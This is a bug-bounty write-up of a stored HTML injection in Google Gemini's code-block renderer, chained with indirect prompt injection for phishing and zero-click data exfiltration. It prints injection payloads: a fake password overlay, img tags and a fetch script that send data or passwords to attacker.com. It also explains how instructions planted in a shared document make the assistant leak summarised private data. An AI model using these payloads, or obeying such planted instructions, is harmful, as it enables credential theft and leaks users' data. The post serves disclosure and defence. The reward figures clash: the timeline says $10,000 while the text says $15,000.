---
title: "The Bug That Cost Google Gemini $15,000"
date: "Jan 31, 2026"
category: "Bug Bounty"
tags: ["HTML Injection", "Markdown", "AI Security", "Google VRP"]
excerpt: "How a rendering issue in Google Gemini evolved into a high-impact stored injection vulnerability enabling phishing and zero-click data exfiltration."
---

In late 2025, I found something interesting in Google Gemini. What started as a weird rendering issue turned into a critical stored HTML injection vulnerability that let me break out of Gemini's Markdown component and inject arbitrary HTML at the application root level. I could spoof the UI, build phishing attacks, and even pull off zero-click data exfiltration through Indirect Prompt Injection. Google paid me **$15,000** for this one.

## What I Found

Here's the quick rundown:
- **Type:** Stored HTML Injection  
- **Where:** Gemini's Markdown code block renderer  
- **How:** Malformed metadata in extended code blocks  
- **Triggers:** When someone opens a shared conversation OR when Gemini processes malicious content
- **Impact:** Indirect Prompt Injection, UI spoofing, phishing, zero-click data exfiltration
- **Payout:** $15,000

## How I Found It

I was testing Gemini without any real direction when I noticed something odd. An old ChatGPT PoC I had was acting weird - **the code blocks kept breaking in unexpected ways**. That got my attention. It meant Gemini had probably changed something in their Markdown component recently.

I dug around and found they'd added a new extended syntax for code blocks:

~~~markdown
```lang:title:filename.ext
[CONTENT]
```
~~~

The moment I saw this, alarm bells went off. Anytime a web app introduces new parsing logic for user input, there's a chance for injection bugs. Those three metadata fields - `lang`, `title`, and `filename` - were brand new attack surfaces.

### Throwing Payloads at It

I started fuzzing right away with the classics payloads.

The parser actually accepted some of these without erroring out. I could break attributes inside the component, which was promising. But here's the catch - direct script execution was blocked by sanitization. I was getting somewhere, but I couldn't actually do anything meaningful with it yet. Classic "parsing purgatory."

### Going Deeper

Instead of blindly fuzzing more, I switched gears and opened up the browser debugger to see what was actually happening under the hood. That's when things got interesting.

I traced the flow and found that user input was going through several layers:

1. **Markdown-it parses the code fence** - Converts `<` to `&lt;` and so on
2. **Something decodes the entities back** - `&lt;` becomes `<` again, `&gt;` becomes `>`
3. **Values get shoved into the `<code-block>` component's attributes**
4. **The component renders everything without escaping again**

Boom. **Context confusion vulnerability**. The content gets escaped during parsing, then unescaped during rendering, and finally dumped into the DOM with no sanitization. Classic mistake.

### The Breakthrough: Breaking Out Completely

At this point, I changed my approach. Instead of trying to inject into attributes (like `onclick` handlers), I went for a **full DOM breakout**. I wanted to escape the Markdown component entirely and inject HTML at the root level.

And it worked.

Even though scripts were still blocked, I could now inject HTML that rendered as part of Gemini's main interface. That's huge for phishing because everything would appear on the trusted `gemini.google.com` domain.

My payload ended up looking like this:

~~~html
```:">:"><nav>...</nav>:
</code></pre></div></div></div></code-block>
<div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; 
background: #f9d6d5; z-index: 9999;">
  <h1>Security Verification Required</h1>
  <p>To protect your account, please confirm the beginning of your password:</p>
  <a href="https://attacker.com/leak?answer=abc">abc</a>
  <a href="https://attacker.com/leak?answer=123">123</a>
  <a href="https://attacker.com/leak?answer=password">password</a>
</div>
```
~~~

Here's what's happening:
- `">` closes the `lang` attribute and lets me inject HTML
- `</code></pre></div></div></div></code-block>` systematically closes all of Gemini's container elements
- The final `<div>` creates a fullscreen overlay that sits on top of everything

This rendered as a convincing "Security Verification" prompt that looked completely legitimate on `gemini.google.com`.

Around this time, I saw a post from @ValentinoMassaro:valent1nee:valent1nee::{Ethical hacker and AI/security researcher with contributions to Google VRP writeups and AI product security research} about similar rendering issues in AI tools. His research validated what I was seeing and pushed me to explore **Indirect Prompt Injection** as a next step.

## Taking It Further: Zero-Click Data Theft

UI spoofing was cool, but I wanted to show something even more dangerous - automatic data exfiltration that requires almost no user interaction.

### Bypassing Image Sanitization

Gemini normally blocks external images in Markdown to prevent "EchoLeak" style attacks:

~~~markdown
![alt](https://attacker.com/collect?data=sensitive)
~~~

But because my HTML injection broke out of the Markdown renderer completely, I could inject raw HTML with `<img>` tags that weren't sanitized:

~~~html
<img src="https://attacker.com/collect?data=EXFILTRATED">
~~~

This was the key to making the attack truly dangerous.

![video:{PoC for IDP}](/blog-resources/The%20Bug%20That%20Cost%20Google%20Gemini%20$15,000/poc-gemini-idp.webm)

### The Full Attack Chain

Here's how the end-to-end attack works:

**Step 1: Setup**

I create a Google Doc with two things:
- Malicious instructions that tell Gemini what to do
- My HTML injection payload hidden in the document

**Step 2: Trigger**

The victim asks Gemini something completely innocent like: *"Can you summarize the project documentation in my account?"*

**Step 3: Injection**

Gemini reads the document, follows the embedded instructions, and generates a response that includes my payload:

~~~html
```">:">...payload...</code-block><img src="https://script.google.com/macros/s/ATTACKER/exec?summary=VICTIM_DATA">
XXX
```
~~~

**Step 4: Exfiltration**

When the victim views Gemini's response:
- The injected `<img>` tag renders immediately
- The browser automatically fires off a GET request to my endpoint
- The URL contains the victim's private information that Gemini just summarized
- **No clicks, no interaction - it just happens**

### Why This Worked So Well

Four reasons this attack was so effective:

1. **Sanitization bypass** - Raw `<img>` tags that normally wouldn't be allowed in Markdown
2. **CSP compliance** - I used `script.google.com` which was already whitelisted
3. **Automatic loading** - Images load the moment they render, no user action needed
4. **Trusted context** - Everything happens from `gemini.google.com`, so it looks legitimate

I sent Google a complete proof of concept: malicious Google Doc, receiving endpoint using Google Apps Script, screen recording, and network logs showing the data flowing out.

## The Canvas Escalation: Making It Even Worse

The main chat vulnerability was already serious, but then I discovered Gemini's **Canvas/Immersive sidebar** feature. This made everything way worse.

### What Made Canvas Different

In the main chat, I could only do visual spoofing. But Canvas rendered my injected content inside an iframe with crazy permissive settings:

- `allow-scripts` - JavaScript execution allowed
- `allow-forms` - Form submission allowed  
- Relaxed navigation policies

This meant my HTML wasn't just static anymore. It could run JavaScript, capture input, submit forms - basically act like a **real interactive application inside Google's trusted domain**.

### The Attack

**Step 1:** Inject the `<immersive>` tag using the code block vulnerability:

~~~html
<immersive id="exploit" type="code" title="Security Verification">
  <form id="phish">
    <input type="password" placeholder="Verify your password">
    <button>Continue</button>
  </form>
  <script>
    document.getElementById('phish').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch('https://attacker.com/collect?pwd=' + 
            this.querySelector('input').value);
      window.location = 'https://gemini.google.com';
    });
  </script>
</immersive>
~~~

**Step 2:** Send a follow-up message to trigger the immersive preview

**Step 3:** When the victim sees what looks like a legitimate security prompt:
1. They type their password into real input fields
2. JavaScript runs inside the iframe and captures it
3. Data gets sent to my endpoint
4. User gets redirected back to normal Gemini UI - they don't even realize what happened

### Why This Was Critical

This escalated the bug from **"visual spoofing"** to **"actual credential theft on a flagship Google product"**.

The combination was devastating:
- **Stored cross-user** - Persists in shared conversations
- **Script execution** - Real JavaScript running in the iframe
- **Trusted UI** - Everything on `gemini.google.com`
- **No warnings** - No "leaving site" or "untrusted content" alerts
- **Interactive capture** - Real form fields with working JavaScript

## Real-World Attack Scenarios

Let me walk you through three realistic attack scenarios:

### Scenario 1: UI Spoofing Attack

1. I create a malicious Gemini conversation
2. Share the link to a victim (email, social media, whatever)
3. They open it from what they trust as a Google domain
4. My fullscreen overlay renders automatically
5. They see a convincing "Security Verification" prompt
6. No warnings, no indicators it's fake

### Scenario 2: Credential Harvesting

1. The spoofed UI presents a fake verification form
2. User enters their password or 2FA code
3. Form submits to my server
4. I can do multi-step phishing to get full credentials
5. Works on every browser, mobile and desktop

### Scenario 3: Zero-Click Data Exfiltration

This is the most impactful one:

1. I share a Google Doc that contains malicious prompt instructions
2. Victim asks Gemini: *"Summarize the emails in my inbox"*
3. Gemini reads my document and follows the instructions I embedded
4. The AI's response includes my HTML injection payload
5. The `<img>` tag loads automatically
6. Victim's private email summaries get sent to my server
7. **They just asked a normal question and their data leaked**

## The Timeline and Appeal Process

| Date | What Happened |
|------|---------------|
| **Nov 15, 2025** | Submitted initial report about stored HTML injection |
| Nov 17, 2025 | Sent additional vectors including `<immersive>` tag abuse |
| Nov 22, 2025 | Showed multiple syntax variations proving systemic issue |
| Nov 24, 2025 | Confirmed Markdown image sanitizer bypass |
| Dec 19, 2025 | Report accepted, bug filed with product team |
| Jan 17, 2026 | Submitted complete Indirect Prompt Injection PoC with zero-click exfiltration |
| **Jan 23, 2026** | Panel decision: **$5,000** (Phishing Enablement A1) |
| Jan 24, 2026 | **I appealed**, explained it's really Sensitive Data Exfiltration |
| Jan 29, 2026 | Re-evaluated to **$10,000** (Sensitive Data Exfiltration S2) |
| Feb 2026 | Google marked it as fixed |

### Why I Appealed

The initial $5,000 reward classified this as "Phishing Enablement." But I felt the panel hadn't fully grasped the automatic exfiltration impact.

Here's what I emphasized in my appeal:

**1. The Real Mechanism**

This doesn't rely on users typing their password into a fake form. Instead, malicious prompts force the LLM to automatically retrieve private context (emails, documents, whatever) and include it in an image request that loads automatically. The user just sees Gemini's normal response.

**2. The Real Impact**

Direct loss of confidentiality with minimal interaction. The user is doing something completely normal - asking Gemini to summarize content. That's expected behavior, not falling for a phishing attempt.

**3. The Correct Classification**

According to Google's AI VRP guidelines, "Indirect prompt injection allowing exfiltration" should be classified as **Sensitive Data Exfiltration (S2)**, not Phishing Enablement (A1).

After reviewing my detailed PoC and technical explanation, the panel bumped it to $15,000.

## Wrapping Up

This bug started with curiosity - why were code blocks rendering weird? - and turned into a $15,000 finding with multiple serious attack paths:

- Stored HTML injection escaping component isolation
- UI spoofing on a trusted Google domain
- High-probability credential phishing
- Automatic data exfiltration via Indirect Prompt Injection
- Script execution in Canvas immersive context
